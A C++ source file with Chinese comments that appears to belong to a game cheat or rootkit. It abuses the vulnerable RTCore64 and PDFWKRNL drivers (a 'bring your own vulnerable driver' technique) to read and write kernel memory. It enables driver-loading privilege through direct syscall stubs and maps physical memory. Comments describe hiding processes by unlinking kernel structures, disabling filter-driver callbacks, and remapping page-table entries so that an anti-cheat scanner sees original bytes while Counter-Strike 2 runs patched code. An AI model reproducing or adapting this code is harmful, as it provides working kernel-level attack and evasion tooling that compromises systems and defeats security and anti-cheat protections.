    void* stAPT = stealth::TartarusGate::GenerateSyscallStub(g_cachedSsnAdjustPrivilegesToken);
    if (!stOPT || !stAPT) {
        if (stOPT) VirtualFree(stOPT, 0, MEM_RELEASE);
        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
        return false;
    }

    // NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)
    using FnOPT = NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, PHANDLE);
    HANDLE hToken = nullptr;
    NTSTATUS ns = reinterpret_cast<FnOPT>(stOPT)(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hToken);
    VirtualFree(stOPT, 0, MEM_RELEASE);
    if (!NT_SUCCESS(ns) || !hToken) {
        if (stAPT) VirtualFree(stAPT, 0, MEM_RELEASE);
        ByovdDiag("BYOVD:EnablePrivilege: NtOpenProcessToken → 0x%08X\n", ns);
        return false;
    }

    // NtAdjustPrivilegesToken: 启用 SeLoadDriverPrivilege (LUID={10, 0})
    using FnAPT = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart = 10;   // SE_LOAD_DRIVER_PRIVILEGE (well-known constant)
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ns = reinterpret_cast<FnAPT>(stAPT)(
        hToken,
        FALSE,
        &tp,
        sizeof(tp),
        nullptr,
        nullptr);
    VirtualFree(stAPT, 0, MEM_RELEASE);
    CloseHandle(hToken);

    bool ok = NT_SUCCESS(ns);
    ByovdDiag("BYOVD:EnablePrivilege: NtAdjustPrivilegesToken → 0x%08X (%s)\n",
        ns, ok ? "OK" : "FAILED");
    return ok;
}

// ============================================================
// 物理内存映射管理
// ============================================================

// 物理内存映射条目
struct PhysMemMapping {
    uint64_t physAddr;       // 映射的物理地址起始
    uint32_t size;           // 映射大小
    uint8_t* virtAddr;       // 映射到的用户态虚拟地址
};

// ★ v3.118: 固定数组, 避免 std::vector CRT 堆依赖
static constexpr size_t MAX_PHYS_MAPPINGS = 64;
static PhysMemMapping g_physMappings[MAX_PHYS_MAPPINGS] = {};
static int g_physMappingCount = 0;

bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
                                        uint8_t** outVirtAddr) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;

    // 页对齐
    uint64_t alignedAddr = physAddr & ~0xFFFULL;
    uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);

    // 检查是否已映射 (固定数组遍历)
    for (int mi = 0; mi < g_physMappingCount; mi++) {
        PhysMemMapping& m = g_physMappings[mi];
        if (m.physAddr == alignedAddr && m.size >= alignedSize) {
            *outVirtAddr = m.virtAddr + (physAddr - alignedAddr);
            return true;
        }
    }

    // ★ v3.100: 使用探测到的 IOCTL 码和格式进行物理内存映射
    //   替代旧的硬编码 {uint64_t, uint32_t, uint32_t} 格式

    // ★ v3.83: 保存关键全局变量到栈, 防止 IOCTL 映射覆盖 .data 段导致指针损坏
    uint8_t* savedBackupBuf    = ::g_backupBuf;
    SIZE_T   savedBackupLen    = ::g_backupLen;
    uint8_t* savedBackupCodeBase = ::g_backupCodeBase;

    // ★ v3.114: 物理内存映射使用 IOCTL_PHYSICAL_READ (0x80002048)
    uint32_t mapIoctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
    ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u fmt=%d ioctl=0x%08X\n",
        (unsigned long long)alignedAddr, alignedSize, (int)g_probedIoctlFormat, mapIoctl);

    uint8_t* mappedAddr = nullptr;
    DWORD devErr = 0;
    bool ok = TryMapPhysical(m_hDevice, mapIoctl, alignedAddr,
                             g_probedIoctlFormat, &mappedAddr, &devErr);

    ByovdDiag("BYOVD:Map: IOCTL RSP ok=%d mappedVA=0x%llX err=%u\n",
        (int)ok, (unsigned long long)(uintptr_t)mappedAddr, devErr);

    // ★ v3.83: IOCTL 后立即 restore 全局变量 (若 .data 段被污染)
    if (::g_backupBuf != savedBackupBuf || ::g_backupCodeBase != savedBackupCodeBase || ::g_backupLen != savedBackupLen) {
        ByovdDiag("BYOVD:Map: DETECT .data corruption! restoring globals\n");
        ::g_backupBuf = savedBackupBuf;
        ::g_backupCodeBase = savedBackupCodeBase;
        ::g_backupLen = savedBackupLen;
    }

    if (!ok || !mappedAddr) {
        ByovdDiag("BYOVD:Map: FAILED — err=%u\n", devErr);
        return false;
    }

    // 缓存映射 (固定数组)
    if (g_physMappingCount < MAX_PHYS_MAPPINGS) {
        PhysMemMapping& mapping = g_physMappings[g_physMappingCount];
        mapping.physAddr = alignedAddr;
        mapping.size     = alignedSize;
        mapping.virtAddr = mappedAddr;
        g_physMappingCount++;
    } else {
        ByovdDiag("BYOVD:Map: MAX_PHYS_MAPPINGS (%zu) reached, evicting oldest\n", MAX_PHYS_MAPPINGS);
        // LRU: 移除最早条目, 新条目放在末尾
        memmove(&g_physMappings[0], &g_physMappings[1],
                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
        g_physMappings[MAX_PHYS_MAPPINGS - 1] = {alignedAddr, alignedSize, mappedAddr};
        // count 不变
    }

    // ★ v3.78: 检测 IOCTL 映射是否覆盖了受保护区 (DLL代码/备份缓冲区)
    //   RTCore64 驱动已通过 MmMapIoSpace/MDL 修改了 PTE — 破坏已发生!
    //   检测到重叠后, 先从备份恢复被破坏的页面, 再返回 false
    bool doesOverlap = IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize);
    ByovdDiag("BYOVD:Map: overlapCheck=%d (regions=%d)\n",
        (int)doesOverlap, g_protectedRegionCount);

    if (doesOverlap) {
        ByovdDiag("BYOVD:MapPhysical: OVERLAP! mappedVA=0x%llX size=%u phys=0x%llX\n",
            (unsigned long long)mappedAddr, alignedSize, (unsigned long long)alignedAddr);

        // ★ v3.78: 主动恢复 — 逐页检查并修复被破坏的受保护区
        if (savedBackupBuf && savedBackupCodeBase && savedBackupLen > 0) {
            uintptr_t overlapStart = (uintptr_t)mappedAddr;
            uintptr_t overlapEnd   = overlapStart + alignedSize;
            uintptr_t codeStart    = (uintptr_t)savedBackupCodeBase;
            uintptr_t codeEnd      = codeStart + savedBackupLen;

            ByovdDiag("BYOVD:Map: overlap range [0x%llX, 0x%llX) vs code [0x%llX, 0x%llX)\n",
                (unsigned long long)overlapStart, (unsigned long long)overlapEnd,
                (unsigned long long)codeStart, (unsigned long long)codeEnd);

            // 找到映射与代码区的交集
            uintptr_t restoreStart = (overlapStart > codeStart) ? overlapStart : codeStart;
            uintptr_t restoreEnd   = (overlapEnd   < codeEnd)   ? overlapEnd   : codeEnd;

            if (restoreStart < restoreEnd) {
                SIZE_T restoreOff = restoreStart - codeStart;
                SIZE_T restoreSz  = restoreEnd - restoreStart;
                BYTE* restoreDst  = (BYTE*)restoreStart;
                BYTE* restoreSrc  = savedBackupBuf + restoreOff;

                ByovdDiag("BYOVD:Map: restoring %llu bytes at off=%llu\n",
                    (unsigned long long)restoreSz, (unsigned long long)restoreOff);

                // 逐页恢复, 保存/恢复原始保护
                SIZE_T restoredBytes = 0;
                while (restoredBytes < restoreSz) {
                    SIZE_T chunk = ((restoreSz - restoredBytes) < 0x1000)
                        ? (restoreSz - restoredBytes) : 0x1000;
                    void* pageVA = restoreDst + restoredBytes;

                    // 跳过 VEH handler 所在页 (保持不变)
                    if (::g_vehHandlerPageVA && (uintptr_t)pageVA == (uintptr_t)::g_vehHandlerPageVA) {
                        ByovdDiag("BYOVD:Map: skip VEH handler page @0x%llX\n", (unsigned long long)pageVA);
                        restoredBytes += chunk;
                        continue;
                    }

                    DWORD oldProt = 0, dummy = 0;
                    BOOL vpOk = VirtualProtect(pageVA, chunk, PAGE_READWRITE, &oldProt);
                    if (!vpOk) {
                        ByovdDiag("BYOVD:Map: VirtualProtect FAILED @0x%llX err=%u\n",
                            (unsigned long long)pageVA, GetLastError());
                        restoredBytes += chunk;
                        continue;
                    }
                    memcpy(pageVA, restoreSrc + restoredBytes, chunk);
                    // 恢复原始保护 (非强制 EXECUTE_READ)
                    VirtualProtect(pageVA, chunk,
                        (oldProt == PAGE_READWRITE) ? PAGE_READWRITE : PAGE_EXECUTE_READ,
                        &dummy);
                    restoredBytes += chunk;
                }
                ByovdDiag("BYOVD:MapPhysical: proactively restored %llu bytes from overlap\n",
                    (unsigned long long)restoredBytes);
            } else {
                ByovdDiag("BYOVD:Map: no intersection with code region\n");
            }
        } else {
            ByovdDiag("BYOVD:Map: no backup available for restore\n");
        }

        if (g_physMappingCount > 0) g_physMappingCount--;
        return false;
    }

    // LRU 淘汰 (固定数组)
    if (g_physMappingCount > MAX_PHYS_MAPPINGS) {
        // 不释放映射 (内核驱动管理), 只从列表中移除
        memmove(&g_physMappings[0], &g_physMappings[1],
                (MAX_PHYS_MAPPINGS - 1) * sizeof(PhysMemMapping));
        g_physMappingCount = MAX_PHYS_MAPPINGS;
    }

    *outVirtAddr = mappedAddr + (physAddr - alignedAddr);
    return true;
}

bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t size) {
    // ★ v3.115: 物理内存读取 — 使用 PhysicalReadViaIOCTL (IOCTL 0x80002048, sub-code 0x12)
    //   物理地址通过 MmMapIoSpace 映射, 与虚拟地址 IOCTL 分离
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    uint32_t ioctl = g_probedReadIoctl ? g_probedReadIoctl : IOCTL_PHYSICAL_READ;
    return PhysicalReadViaIOCTL(m_hDevice, ioctl, physAddr, outBuf, size);
}

bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
    // ★ v3.115: 物理内存写入 — 使用 PhysicalWriteViaIOCTL (IOCTL 0x8000204C, sub-code 0x13)
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    uint32_t writeIoctl = g_probedWriteIoctl ? g_probedWriteIoctl : IOCTL_PHYSICAL_WRITE;
    return PhysicalWriteViaIOCTL(m_hDevice, writeIoctl, physAddr, inBuf, size);
}

// ============================================================
// 内核虚拟地址读写
// ★ v3.124: RTCore64 使用 PhysicalReadViaIOCTL (0x80002048) — 直接读写内核VA
// ★ BUILD 489: PDFWKRNL 使用 IOCTL 0x80002014 — memcpy 内核VA R/W
// ============================================================

// ============================================================
// ★ BUILD 532: PDFWKRNL IOCTL 超时保护 — overlapped I/O + 超时
//   问题: PDFWKRNL.sys 驱动在长时间运行 (~5分钟) 后停止处理 IRP,
//         同步 DeviceIoControl 永久阻塞, 导致主循环卡死 (非崩溃).
//   修复: 使用 overlapped I/O + 2 秒超时, 超时后 CancelIoEx 取消 IRP,
//         进入 10 秒冷却期跳过后续 IOCTL, 避免永久阻塞主循环.
//   ★ BUILD 532 fix: PDFWKRNL 驱动只允许一个句柄 (第二个 CreateFileW 返回 err=5),
//     改用 close-and-reopen: 关闭同步句柄, 用 FILE_FLAG_OVERLAPPED 重开.
// ============================================================
static bool   g_overlappedActive = false;       // m_hDevice 是否为 overlapped 句柄
static DWORD  g_ioctlCooldownUntil = 0;         // 冷却期截止 tick (期间跳过 IOCTL)
static DWORD  g_ioctlTimeoutCount = 0;          // 累计超时次数 (诊断用)
static DWORD  g_lastIoctlSuccessTick = 0;       // 最后一次成功 IOCTL tick

// ★ BUILD 532 fix: 尝试将 m_hDevice 切换为 overlapped 句柄 (close-and-reopen)
//   PDFWKRNL 驱动只允许一个句柄, 必须先关闭同步句柄再重开 overlapped
//   成功: g_overlappedActive=true, m_hDevice 更新为 overlapped 句柄
//   失败: 恢复同步句柄, g_overlappedActive=false (无超时保护, 但至少能工作)
static bool TrySwitchToOverlapped(HANDLE& hDevice, const wchar_t* devicePath) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    HANDLE hOld = hDevice;
    // 先关闭同步句柄
    CloseHandle(hOld);
    // 用 FILE_FLAG_OVERLAPPED 重新打开
    hDevice = CreateFileW(devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, nullptr);
    if (hDevice != INVALID_HANDLE_VALUE) {
        g_overlappedActive = true;
        ByovdDiag("BYOVD:OverlappedSwitch: OK (FILE_FLAG_OVERLAPPED), timeout protection active\n");
        return true;
    }
    // 重开失败 — 回退到同步句柄
    DWORD err = GetLastError();
    hDevice = CreateFileW(devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice != INVALID_HANDLE_VALUE) {
        ByovdDiag("BYOVD:OverlappedSwitch: FAILED err=%u, restored synchronous handle\n", err);
    } else {
        ByovdDiag("BYOVD:OverlappedSwitch: CRITICAL — both overlapped and sync reopen failed err=%u\n", GetLastError());
    }
    g_overlappedActive = false;
    return false;
}

// ★ BUILD 532: 带超时的 IOCTL 调用 (overlapped I/O)
//   timeoutMs: 超时毫秒 (建议 2000ms)
//   超时后 CancelIoEx 取消 IRP, 设置 10 秒冷却期
static bool PdfwIoctlWithTimeout(HANDLE hDevice, DWORD ioctlCode,
    void* buf, DWORD bufSize, DWORD timeoutMs) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;

    // 冷却期检查 — 驱动疑似卡死时跳过 IOCTL
    // ★ BUILD 555 P2-verify: 修复 GetTickCount 回绕时的冷却检查 bug
    //   原实现: now < g_ioctlCooldownUntil (直接无符号比较)
    //   问题: GetTickCount 接近 UINT32_MAX 时, +10000 回绕到小值,
    //         now (大) < g_ioctlCooldownUntil (小) → false → 错误地允许 IOCTL
    //         (与 IsIoctlInCooldown L2499-2506 修复前的 bug 同源)
    //   修复: 用 (g_ioctlCooldownUntil - now) < 0x7FFFFFFF 判断 "冷却截止时间在未来"
    //         (无符号回绕安全, GetTickCount DWORD 溢出时仍正确)
    DWORD now = GetTickCount();
    if (g_ioctlCooldownUntil) {
        DWORD remaining = g_ioctlCooldownUntil - now;  // 无符号回绕安全
        if (remaining < 0x7FFFFFFF) {
            return false;  // 冷却中, 跳过
        }
    }

    // 创建手动重置事件 (overlapped 完成通知)
    HANDLE hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!hEvent) return false;

    OVERLAPPED ov = {};
    ov.hEvent = hEvent;

    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
        buf, bufSize, buf, bufSize,
        &bytesReturned, &ov);

    if (!ok) {
        DWORD err = GetLastError();
        if (err != ERROR_IO_PENDING) {
            // 立即失败 (非 pending, 如参数错误)
            CloseHandle(hEvent);
            return false;
        }
        // ERROR_IO_PENDING 是 overlapped 正常行为, 继续等待
    }

    // 带超时等待 IRP 完成
    DWORD waitResult = WaitForSingleObject(hEvent, timeoutMs);
    if (waitResult == WAIT_TIMEOUT) {
        // 超时! 取消未完成的 IRP
        CancelIoEx(hDevice, &ov);
        // ★ BUILD 532 fix: 等待取消完成 (最多 1 秒), 避免 IRP 完成时访问已关闭的事件
        //   如果驱动响应取消, IRP 完成并设置事件, 可安全关闭
        //   如果驱动完全卡死不响应取消, 泄漏事件避免 use-after-close 崩溃
        DWORD cancelResult = WaitForSingleObject(hEvent, 1000);
        if (cancelResult == WAIT_OBJECT_0) {
            CloseHandle(hEvent);  // IRP 已完成, 安全关闭
        } else {
            // 驱动未响应取消, IRP 仍 pending — 泄漏事件避免崩溃
            // (冷却期会阻止后续 IOCTL, 避免持续泄漏)
            ByovdDiag("BYOVD:IOCTL TIMEOUT — driver not responding to cancel, event leaked\n");
        }
        g_ioctlTimeoutCount++;
        g_ioctlCooldownUntil = GetTickCount() + 10000;  // 10 秒冷却
        ByovdDiag("BYOVD:IOCTL TIMEOUT #%u (ioctl=0x%08X, %ums) — cooldown 10s\n",
            g_ioctlTimeoutCount, ioctlCode, timeoutMs);
        return false;
    }

    CloseHandle(hEvent);

    if (waitResult != WAIT_OBJECT_0) {
        return false;  // 异常等待结果
    }

    // 获取最终 overlapped 结果
    if (!GetOverlappedResult(hDevice, &ov, &bytesReturned, FALSE)) {
        return false;
    }

    g_lastIoctlSuccessTick = GetTickCount();
    g_ioctlCooldownUntil = 0;  // 成功, 清除冷却
    return bytesReturned > 0 || bufSize == 0;
}

// ★ BUILD 489: PDFWKRNL 内核VA读取 — 通过 IOCTL 0x80002014 memcpy
//   驱动内部: memcpy(outBuf, kernelVA, size) — 无安全检查
//   ★ BUILD 532: 改用 overlapped I/O + 2 秒超时, 防止驱动卡死导致永久阻塞
static bool PdfwReadKernelVA(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    if (size > 0x100000) return false; // 1MB 上限

    PDFW_MEMCPY_REQUEST request = {};
    request.Destination = outBuf;      // 驱动将数据写到 outBuf
    request.Source = (void*)kernelVA;  // 从内核VA读取
    request.Size = (uint32_t)size;

    // ★ BUILD 532: g_overlappedActive=true 时使用 overlapped I/O + 超时
    if (g_overlappedActive) {
        return PdfwIoctlWithTimeout(hDevice, IOCTL_AMDPDFW_MEMCPY,
            &request, sizeof(request), 2000);
    }
    // 回退: 同步路径 (overlapped 不可用时)
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
        &request, sizeof(request),
        &request, sizeof(request),
        &bytesReturned, nullptr);
    return ok && (bytesReturned > 0 || size == 0);
}

// ★ BUILD 489: PDFWKRNL 内核VA写入 — 通过 IOCTL 0x80002014 memcpy
//   驱动内部: memcpy(kernelVA, inBuf, size) — 无安全检查
//   ★ BUILD 532: 改用 overlapped I/O + 2 秒超时, 防止驱动卡死导致永久阻塞
static bool PdfwWriteKernelVA(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    if (size > 0x100000) return false;

    PDFW_MEMCPY_REQUEST request = {};
    request.Destination = (void*)kernelVA;  // 驱动将数据写到内核VA
    request.Source = (void*)inBuf;          // 从用户缓冲区读取
    request.Size = (uint32_t)size;

    // ★ BUILD 532: g_overlappedActive=true 时使用 overlapped I/O + 超时
    if (g_overlappedActive) {
        return PdfwIoctlWithTimeout(hDevice, IOCTL_AMDPDFW_MEMCPY,
            &request, sizeof(request), 2000);
    }
    // 回退: 同步路径 (overlapped 不可用时)
    DWORD bytesReturned = 0;
    BOOL ok = DeviceIoControl(hDevice, IOCTL_AMDPDFW_MEMCPY,
        &request, sizeof(request),
        &request, sizeof(request),
        &bytesReturned, nullptr);
    return ok && (bytesReturned > 0 || size == 0);
}

bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false;
    // ★ BUILD 567 v3.296 FIX: 下限 0xFFFFF680 → 0xFFFF8000 (包含非分页池扩展区域)
    //   根因: Win11 24H2/25H2 内核池分配 (FLT_FILTER, EPROCESS, FLT_OPERATION_REGISTRATION)
    //         位于非分页池扩展区域 [0xFFFF8000, 0xFFFFF680).
    //   原 ReadKernelVA 下限 0xFFFFF680 拒绝读取该区域 → MinifilterNeutralizer
    //     读取 FLT_FILTER 字段失败 → 中和失败 → pacStatus=Failed/NotInstalled 误判.
    //   修复: 下限放宽到 0xFFFF8000, 上限保持 0xFFFFFD00 (排除系统 PTE).
    //   安全性: [0xFFFF8000, 0xFFFFF680) 是非分页池扩展/PFN, 是有效内核内存, 读取不蓝屏.
    //           v3.228 蓝屏 0x50 根因是系统 PTE [0xFFFFFD00, 0xFFFFFE00), 仍被排除.
    //   白名单 [0xFFFF8000, 0xFFFFFD00), 精确包含:
    //                - 非分页池扩展/PFN (0xFFFF8000-0xFFFFF680) ← Win11 24H2 FLT_FILTER/EPROCESS 所在
    //                - PTE 自映射        (0xFFFFF680-0xFFFFF700)
    //                - 内核镜像          (0xFFFFF800-0xFFFFFA00)
    //                - 非分页池          (0xFFFFFA00-0xFFFFFC00)
    //                - 分页池            (0xFFFFFC00-0xFFFFFD00) ← VAD 节点所在
    //                排除系统 PTE (0xFFFFFD00+) + 系统映射 + Hypervisor.
    if (va < 0xFFFF800000000000ULL) return false;       // ★ v3.296: 下限放宽到 0xFFFF8000
    if (va >= 0xFFFFFD0000000000ULL) return false;      // ★ v3.231: 排除系统 PTE (v3.228 蓝屏 0x50 根因)
    // ★ v3.296 FIX-13: 检查结束地址 va+size 不超过白名单上限
    //   原因: 只检查起始地址 va, 不检查 va+size. 若 va 接近上限 (如 0xFFFFFCFF),
    //         va+size 跨越到系统 PTE 区域 (0xFFFFFD00+), driver memcpy 读取未映射页 → 0x50 蓝屏.
    //   修复: 检查 va+size <= 0xFFFFFD00, 超过则拒绝.
    if (va + size > 0xFFFFFD0000000000ULL) return false;  // ★ FIX-13: 结束地址范围检查

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwReadKernelVA(m_hDevice, va, outBuf, size);
    }
    // ★ v3.124: 使用 PhysicalReadViaIOCTL (0x80002048) — 此RTCore64版本直接将地址作为内核VA处理
    return PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, va, outBuf, size);
}

bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t size) {
    if (!m_active) return false;
    if (va < 0xFFFF800000000000ULL) return false;
    // ★ BUILD 567 v3.296 FIX: 与 ReadKernelVA 一致, 下限 0xFFFFF680 → 0xFFFF8000
    //   原因: Win11 24H2 FLT_OPERATION_REGISTRATION 数组可能在非分页池扩展区域
    //         [0xFFFF8000, 0xFFFFF680), WriteKernelVA 下限 0xFFFFF680 会拒绝写入
    //         → NeutralizeCallbacks 替换 PreOp/PostOp 指针失败.
    //   修复: 下限放宽到 0xFFFF8000, 上限保持 0xFFFFFD00 (排除系统 PTE).
    //   安全性: FLT_OPERATION_REGISTRATION 是有效内核池内存, 写入不蓝屏.
    if (va < 0xFFFF800000000000ULL) return false;       // ★ v3.296: 下限放宽到 0xFFFF8000
    if (va >= 0xFFFFFD0000000000ULL) return false;      // ★ v3.231: 排除系统 PTE
    // ★ v3.296 FIX-13: 检查结束地址 va+size 不超过白名单上限 (同 ReadKernelVA)
    if (va + size > 0xFFFFFD0000000000ULL) return false;  // ★ FIX-13: 结束地址范围检查

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwWriteKernelVA(m_hDevice, va, inBuf, size);
    }
    // ★ v3.124: 使用 PhysicalWriteViaIOCTL (0x8000204C) — 直接内核VA写入
    return PhysicalWriteViaIOCTL(m_hDevice, g_probedWriteIoctl, va, inBuf, size);
}

// ★ BUILD 567 v3.233: EPROCESS 专用读取 (绕过白名单)
//   背景: v3.232 发现 EnsureEprocessOffsets 失败 (pidMatch=0), 根因是 systemEPROCESS
//        可能在系统 PTE 区域 (0xFFFFFD00-0xFFFFFE00), 被 ReadKernelVA 白名单拒绝
//   方案: 绕过白名单, 但有更严格的安全边界 [0xFFFFF800, 0xFFFFFE00)
//   安全性: EPROCESS 是有效的内核内存, 读取不应导致 0x50 蓝屏
//           v3.228 蓝屏 0x50 是因为读取了系统 PTE 区域的无效地址, 不是 EPROCESS
// ★ BUILD 567 v3.234 FIX (7/20 02:10): 扩大安全边界到 [0xFFFF8000, 0xFFFFFE00)
//   v3.233 测试发现 systemEPROCESS=0xFFFF928F9F6DC040 在非分页池扩展区域 (0xFFFF8000-0xFFFFF680)
//   Win11 24H2/25H2 EPROCESS 分配在非分页池扩展, 非 v3.233 假设的系统 PTE 区域
//   扩大边界包含非分页池扩展/PFN 数据库, 覆盖所有可能的 EPROCESS 分配区域
bool KernelMemoryAccessor::ReadKernelVAUnsafe(uint64_t va, void* outBuf, size_t size) {
    if (!m_active) return false;
    // ★ v3.234: 安全边界 [0xFFFF8000, 0xFFFFFE00) — 覆盖所有 EPROCESS 可能分配区域
    //   包含: 非分页池扩展/PFN (0xFFFF8000-0xFFFFF680) ← Win11 24H2/25H2 EPROCESS 所在
    //         系统缓存         (0xFFFFF680-0xFFFFF800)
    //         PTE 自映射        (0xFFFFF680-0xFFFFF700) — 实际 PTE 自映射
    //         内核镜像          (0xFFFFF800-0xFFFFFA00)
    //         非分页池          (0xFFFFFA00-0xFFFFFC00)
    //         分页池            (0xFFFFFC00-0xFFFFFD00) ← VAD 节点所在
    //         系统 PTE          (0xFFFFFD00-0xFFFFFE00)
    //   排除: 系统映射 (0xFFFFFE00+) + Hypervisor (0xFFFFFF00+)
    if (va < 0xFFFF800000000000ULL) return false;
    if (va >= 0xFFFFFE0000000000ULL) return false;
    // ★ v3.296 FIX-15: 检查结束地址 va+size 不超过安全边界上限
    //   (同 ReadKernelVA FIX-13, 防止跨边界读取未映射页)
    if (va + size > 0xFFFFFE0000000000ULL) return false;

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwReadKernelVA(m_hDevice, va, outBuf, size);
    }
    return PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, va, outBuf, size);
}

// ★ BUILD 567 v3.235: EPROCESS 专用写入 (绕过白名单)
//   背景: v3.234 修复 DKOM 读取后, 发现 DKOM 写入 (PerformUnlink/SelfLoopHarden/UnhideProcessByPid)
//        也用 WriteKernelVA (白名单), 写入 EPROCESS (非分页池扩展) 失败
//   方案: 绕过白名单, 安全边界 [0xFFFF8000, 0xFFFFFE00) 与 ReadKernelVAUnsafe 一致
//   安全性: EPROCESS 是有效内核内存, 写入不应导致 0x50 蓝屏
//           DKOM 断链 + SelfLoopHarden 逻辑已验证 (BUILD 558 FIX), 不会触发 0x139
bool KernelMemoryAccessor::WriteKernelVAUnsafe(uint64_t va, const void* inBuf, size_t size) {
    if (!m_active) return false;
    // ★ v3.235: 安全边界 [0xFFFF8000, 0xFFFFFE00) — 与 ReadKernelVAUnsafe 一致
    if (va < 0xFFFF800000000000ULL) return false;
    if (va >= 0xFFFFFE0000000000ULL) return false;
    // ★ v3.296 FIX-15: 检查结束地址 va+size 不超过安全边界上限 (同 ReadKernelVAUnsafe)
    if (va + size > 0xFFFFFE0000000000ULL) return false;

    // ★ BUILD 489: 根据驱动类型分发
    if (g_isPdfwKrnl) {
        return PdfwWriteKernelVA(m_hDevice, va, inBuf, size);
    }
    return PhysicalWriteViaIOCTL(m_hDevice, g_probedWriteIoctl, va, inBuf, size);
}

// ============================================================
// ★ BUILD 549: PTE Manipulation API (Shadow Page)
//   通过 PTE 自映射实现影子页 — CS2 执行补丁字节 (pageB), PAC 扫描看到原始字节 (pageA)
//
//   技术原理:
//   - Win10/11 PML4 自引用索引: 0x1ED (固定)
//   - PTE_BASE = 0xFFFFF68000000000
//   - 任意 VA 的 PTE 虚拟地址 = PTE_BASE + ((va >> 12) << 3)
//   - PTE 结构: bit 0=P, 1=RW, 2=U/S, 5=A, 6=D, 7=PS, 8=G, 12-51=PFN, 63=NX
//
//   影子页策略:
//   - pageA = client.dll 原页 (PAC 扫描看到原始字节, 无需分配)
//   - pageB = VirtualAlloc + VirtualLock 锁定的用户态页 (复制原字节 + 改 90 90)
//   - 修改 client.dll 补丁页的 PTE.PFN 指向 pageB → CS2 执行补丁代码
//   - 周期性切回 pageA 50ms → PAC 扫描命中原始字节
// ============================================================

// PTE 自映射基址 (Win10 1709+ 固定, PML4 自引用索引 0x1ED)
//   PTE_BASE = 0xFFFFF68000000000 = ((0xFFFFF6FB7DB00000ULL) + 0x1ED * 8 * 0x1000 * 0x200 * 0x80000)
//   简化: 0xFFFFF68000000000 + ((va >> 12) << 3) 直接得到 PTE VA
static constexpr uint64_t PTE_BASE = 0xFFFFF68000000000ULL;

// PTE 字段位掩码
static constexpr uint64_t PTE_PRESENT  = 1ULL << 0;
static constexpr uint64_t PTE_RW       = 1ULL << 1;
static constexpr uint64_t PTE_USER     = 1ULL << 2;
static constexpr uint64_t PTE_PFN_MASK = 0x000FFFFFFFFFF000ULL;  // bit 12-51

uint64_t KernelMemoryAccessor::ReadPte(uint64_t va, uint64_t* outPteValue) {
    if (!m_active || !outPteValue) return 0;
    // PTE 自映射公式: PTE_BASE + ((va >> 12) << 3)
    //   注: va >> 12 是页号, << 3 是每个 PTE 8 字节
    //   完整公式包含 PML4/PDPT/PD 自引用层级, 但 PTE_BASE 已编码了所有层级偏移
    uint64_t pteVA = PTE_BASE + ((va >> 12) << 3);
    if (!ReadKernelVA(pteVA, outPteValue, 8)) {
        ByovdDiag("B549:01 va=0x%llX pteVA=0x%llX FAIL\n",
                  (unsigned long long)va, (unsigned long long)pteVA);
        return 0;
    }
    return pteVA;
}

bool KernelMemoryAccessor::WritePte(uint64_t va, uint64_t newPteValue) {
    if (!m_active) return false;
    uint64_t pteVA = PTE_BASE + ((va >> 12) << 3);
    if (!WriteKernelVA(pteVA, &newPteValue, 8)) {
        ByovdDiag("B549:02 va=0x%llX pteVA=0x%llX FAIL\n",
                  (unsigned long long)va, (unsigned long long)pteVA);
        return false;
    }
    return true;
}

bool KernelMemoryAccessor::VerifyPteSelfMap() {
    if (m_pml4SelfRefIndex) return true;  // 已验证
    if (!m_active) return false;

    // ★ BUILD 549: 改进验证策略 — 不依赖 ReadPhysical (PDFWKRNL 模式下不可用)
    //
    // 策略:
    //   1. 假设 PML4 自引用索引为 0x1ED (Win10 1709+ 固定)
